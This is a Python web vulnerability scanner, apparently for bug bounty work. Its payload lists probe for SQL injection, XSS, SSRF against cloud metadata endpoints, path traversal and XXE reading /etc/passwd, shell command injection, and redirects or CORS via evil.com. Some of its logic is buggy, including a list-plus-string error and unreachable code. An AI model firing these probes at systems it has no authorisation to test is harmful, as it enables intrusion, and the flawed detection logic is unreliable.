"""Real vulnerability scanner for bug bounty hunting.

Actively tests for:
- SQL Injection (blind, error-based, time-based)
- XSS (reflected, stored, DOM-based)
- SSRF (internal network access)
- XXE (XML External Entity)
- Command Injection
- Path Traversal
- Open Redirects
- IDOR (Insecure Direct Object References)
- Authentication Bypass
- CORS Misconfiguration
- Security Header issues
"""

import re
import time
import logging
import requests
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


class VulnerabilityScanner:
    """Advanced vulnerability scanner for real bug detection."""
    
    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.user_agent})
        
    def scan_url(self, url: str, params: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """
        Comprehensively scan a URL for vulnerabilities.
        
        Args:
            url: Target URL
            params: URL parameters to test
        
        Returns:
            List of vulnerabilities found
        """
        findings = []
        
        # Test for various vulnerabilities
        findings.extend(self._test_reflection(url, params)) # Basic check
        findings.extend(self._test_sqli(url, params))
        findings.extend(self._test_xss(url, params))
        findings.extend(self._test_ssrf(url, params))
        findings.extend(self._test_path_traversal(url, params))
        findings.extend(self._test_open_redirect(url, params))
        findings.extend(self._test_command_injection(url, params))
        findings.extend(self._test_xxe(url))
        findings.extend(self._test_ssti(url, params))
        findings.extend(self._test_parameter_pollution(url, params))
        
        return findings

    def _test_reflection(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test if input is reflected (Basic check for debugging/verification)."""
        findings = []
        if not params: return findings

        canary = "CyKyTestReflect" + str(int(time.time()))
        
        for param_name in params.keys():
            try:
                test_params = params.copy()
                test_params[param_name] = canary
                resp = self.session.get(url, params=test_params, timeout=self.timeout)
                
                if canary in resp.text:
                     findings.append({
                        'type': 'Input Reflection (Info)',
                        'severity': 'INFO',
                        'url': url,
                        'parameter': param_name,
                        'evidence': f"Canary '{canary}' reflected in response",
                        'method': 'reflection check',
                        'poc': f"GET {url}?{param_name}={canary}"
                    })
                     # Once we find one reflection in param, good enough for 'Info'
                     break 
            except: 
                pass
        return findings
        # Removed low-impact checks: CORS, Security Headers
        
        return findings
    
    def _test_sqli(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for SQL Injection vulnerabilities."""
        findings = []
        
        if not params:
            return findings
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' UNION SELECT NULL--",
            "1' WAITFOR DELAY '0:0:5'--",  # Time-based
            "1' AND SLEEP(5)--",  # MySQL time-based
            "1' AND pg_sleep(5)--",  # PostgreSQL time-based
        ]
        
        # SQL error patterns
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark",
            r"sqlite3.OperationalError",
        ]
        
        for param_name, param_value in params.items():
            for payload in sql_payloads:
                try:
                    # Create test URL with payload
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    # Measure response time for time-based detection
                    start_time = time.time()
                    resp = self.session.get(url, params=test_params, timeout=self.timeout, allow_redirects=False)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors in response
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, resp.text, re.IGNORECASE):
                            findings.append({
                                'type': 'SQL Injection',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"SQL error found in response",
                                'method': 'error-based',
                                'poc': f"GET {url}?{param_name}={payload}"
                            })
                            break
                    
                    # Time-based SQLi detection
                    if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                        if response_time >= 4.5:  # Threshold for 5-second delay
                            findings.append({
                                'type': 'SQL Injection (Time-Based)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Response delayed by {response_time:.2f} seconds",
                                'method': 'time-based blind',
                                'poc': f"GET {url}?{param_name}={payload}"
                            })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _test_xss(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Cross-Site Scripting vulnerabilities."""
        findings = []
        
        if not params:
            return findings
        
        # XSS payloads
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
        ]
        
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    # Check if payload is reflected unescaped
                    if payload in resp.text:
                        # Check if it's actually in executable context
                        if self._is_exploitable_xss(resp.text, payload):
                            findings.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'HIGH',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Payload reflected unescaped in HTML",
                                'method': 'reflected',
                                'poc': f"GET {url}?{param_name}={payload}"
                            })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _is_exploitable_xss(self, html: str, payload: str) -> bool:
        """Check if XSS payload is in exploitable context."""
        # Simple heuristic: check if payload is not in HTML-escaped form
        escaped_variants = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;'),
        ]
        
        for escaped in escaped_variants:
            if escaped in html:
                return False  # Payload was escaped
        
        return True  # Payload appears unescaped
    
    def _test_ssrf(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Server-Side Request Forgery."""
        findings = []
        
        if not params:
            return findings
        
        # SSRF payloads targeting internal resources
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://192.168.1.1",
            "http://10.0.0.1",
            "file:///etc/passwd",
            "http://[::1]",  # IPv6 localhost
        ]
        
        # Parameters likely to be SSRF vectors
        ssrf_params = ['url', 'uri', 'redirect', 'next', 'path', 'file', 'load', 'fetch']
        
        for param_name, param_value in params.items():
            if not any(p in param_name.lower() for p in ssrf_params):
                continue
            
            for payload in ssrf_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    # Check for indicators of successful SSRF
                    indicators = [
                        'root:x:0:0',  # /etc/passwd content
                        'ami-id',  # AWS metadata
                        'instance-id',
                        'privateIp',
                        'metadata.google',
                    ]
                    
                    for indicator in indicators:
                        if indicator in resp.text:
                            findings.append({
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Internal resource accessible: {indicator}",
                                'method': 'parameter injection',
                                'poc': f"GET {url}?{param_name}={payload}"
                            })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _test_path_traversal(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Path Traversal vulnerabilities."""
        findings = []
        
        if not params:
            return findings
        
        # Path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
        ]
        
        # Parameters likely to be file access vectors
        file_params = ['file', 'path', 'dir', 'folder', 'download', 'doc', 'page']
        
        for param_name, param_value in params.items():
            if not any(p in param_name.lower() for p in file_params):
                continue
            
            for payload in traversal_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    # Check for file content indicators
                    if ('root:x:0:0' in resp.text or  # Linux /etc/passwd
                        '[extensions]' in resp.text):  # Windows win.ini
                        findings.append({
                            'type': 'Path Traversal / LFI',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'System file content accessible',
                            'method': 'directory traversal',
                            'poc': f"GET {url}?{param_name}={payload}"
                        })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _test_open_redirect(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Open Redirect vulnerabilities."""
        findings = []
        
        if not params:
            return findings
        
        # Open redirect payloads
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "https:evil.com",
            "//google.com",
            "javascript:alert(1)",
        ]
        
        # Parameters likely to be redirect vectors
        redirect_params = ['url', 'redirect', 'next', 'return', 'returnto', 'goto', 'continue']
        
        for param_name, param_value in params.items():
            if not any(p in param_name.lower() for p in redirect_params):
                continue
            
            for payload in redirect_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=self.timeout, allow_redirects=False)
                    
                    # Check if redirect location matches our payload
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or 'google.com' in location:
                            findings.append({
                                'type': 'Open Redirect',
                                'severity': 'MEDIUM',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Redirects to {location}",
                                'method': 'parameter manipulation',
                                'poc': f"GET {url}?{param_name}={payload}"
                            })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _test_command_injection(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Command Injection vulnerabilities."""
        findings = []
        
        if not params:
            return findings
        
        # Command injection payloads
        cmd_payloads = [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
        ]
        
        for param_name, param_value in params.items():
            for payload in cmd_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = param_value + payload
                    
                    start_time = time.time()
                    resp = self.session.get(url, params=test_params, timeout=10)
                    response_time = time.time() - start_time
                    
                    # Time-based detection
                    if response_time >= 4.5:
                        findings.append({
                            'type': 'Command Injection',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"Command execution delayed response by {response_time:.2f}s",
                            'method': 'time-based blind',
                            'poc': f"GET {url}?{param_name}={param_value}{payload}"
                        })
                
                except requests.RequestException:
                    pass
        
        return findings
    
    def _test_xxe(self, url: str) -> List[Dict]:
        """Test for XML External Entity (XXE) vulnerabilities."""
        findings = []
        
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = self.session.post(url, data=xxe_payload, headers=headers, timeout=self.timeout)
            
            if 'root:x:0:0' in resp.text:
                findings.append({
                    'type': 'XML External Entity (XXE)',
                    'severity': 'CRITICAL',
                    'url': url,
                    'payload': xxe_payload,
                    'evidence': '/etc/passwd content in response',
                    'method': 'XXE injection',
                    'poc': f"POST {url} with XXE payload"
                })
        
        except requests.RequestException:
            pass
        
        return findings
    
    def _test_cors(self, url: str) -> List[Dict]:
        """Test for CORS misconfiguration."""
        findings = []
        
        try:
            headers = {'Origin': 'https://evil.com'}
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            
            # Dangerous: reflecting attacker origin with credentials
            if acao == 'https://evil.com' and acac.lower() == 'true':
                findings.append({
                    'type': 'CORS Misconfiguration',
                    'severity': 'HIGH',
                    'url': url,
                    'evidence': f"ACAO: {acao}, ACAC: {acac}",
                    'description': 'Arbitrary origin reflected with credentials enabled',
                    'method': 'header analysis',
                    'poc': f"GET {url} with Origin: https://evil.com"
                })
            
            # Wildcard with credentials (invalid but sometimes implemented)
            if acao == '*' and acac.lower() == 'true':
                findings.append({
                    'type': 'CORS Misconfiguration',
                    'severity': 'HIGH',
                    'url': url,
                    'evidence': 'Wildcard origin with credentials',
                    'method': 'header analysis',
                    'poc': f"GET {url}"
                })
        
        except requests.RequestException:
            pass
        
        return findings
    
    def _test_ssti(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Server-Side Template Injection vulnerabilities."""
        findings = []
        if not params: return findings

        # SSTI Payloads (Generic, Ninja2, Mako, etc.)
        ssti_payloads = [
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "@{7*7}",
            "#{7*7}"
        ]

        for param_name, param_value in params.items():
            for payload in ssti_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    
                    if "49" in resp.text and payload not in resp.text: # Logic: 7*7 evaluated to 49
                         findings.append({
                            'type': 'Server-Side Template Injection (SSTI)',
                            'severity': 'CRITICAL',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'Expression evaluated to 49',
                            'method': 'template injection',
                            'poc': f"GET {url}?{param_name}={payload}"
                        })
                except requests.RequestException:
                    pass
        return findings

    def _test_parameter_pollution(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for HTTP Parameter Pollution."""
        findings = []
        if not params: return findings

        for param_name in params.keys():
            try:
                # Test logic: supply param twice with different values
                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=pollutes_test_1&{param_name}=pollutes_test_2"
                resp = self.session.get(test_url, timeout=self.timeout)
                
                # Heuristic: Check if both values are reflected or if behavior changes significantly
                # (Simplified check for now: reflection of second value)
                if "pollutes_test_2" in resp.text and "pollutes_test_1" not in resp.text:
                     findings.append({
                        'type': 'HTTP Parameter Pollution',
                        'severity': 'MEDIUM',
                        'url': url,
                        'parameter': param_name,
                        'evidence': 'Second parameter value overrides first',
                        'method': 'HPP',
                        'poc': test_url
                    })
            except requests.RequestException:
                pass
        return findings

    def _test_security_headers(self, url: str) -> List[Dict]:
        """Test for missing security headers."""
        findings = []
        
        try:
            resp = self.session.get(url, timeout=self.timeout)
            
            # Critical security headers
            important_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'Browser XSS filter',
            }
            
            missing = []
            for header, description in important_headers.items():
                if header not in resp.headers:
                    missing.append(f"{header} ({description})")
            
            if missing:
                findings.append({
                    'type': 'Missing Security Headers',
                    'severity': 'LOW',
                    'url': url,
                    'evidence': f"Missing: {', '.join(missing)}",
                    'description': 'Security headers not implemented',
                    'method': 'header analysis',
                })
        
        except requests.RequestException:
            pass
        
        return findings


def scan_endpoints_for_vulnerabilities(endpoints: List[str], max_workers: int = 10) -> List[Dict]:
    """
    Scan multiple endpoints for vulnerabilities in parallel.
    
    Args:
        endpoints: List of URLs to scan
        max_workers: Number of parallel workers
    
    Returns:
        List of all vulnerabilities found
    """
    scanner = VulnerabilityScanner()
    all_findings = []
    
    def scan_single(endpoint_data):
        if isinstance(endpoint_data, dict):
            url = endpoint_data.get('url', str(endpoint_data))
            params = parse_qs(urlparse(url).query)
        else:
            url = str(endpoint_data)
            params = parse_qs(urlparse(url).query)
        
        return scanner.scan_url(url, params)
    
    logger.info(f"Starting scan on {len(endpoints)} endpoints with {max_workers} workers")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # REMOVED LIMIT: Process ALL endpoints passed to function
        futures = {executor.submit(scan_single, ep): ep for ep in endpoints}
        
        for future in as_completed(futures):
            try:
                findings = future.result()
                all_findings.extend(findings)
                # Log progress
                ep = futures[future]
                if findings:
                    logger.info(f"[!] Found {len(findings)} vulnerabilities on {ep}")
            except Exception as e:
                logger.error(f"Scan error for endpoint: {e}")
    
    logger.info(f"Scan complete. Total findings: {len(all_findings)}")
    return all_findings
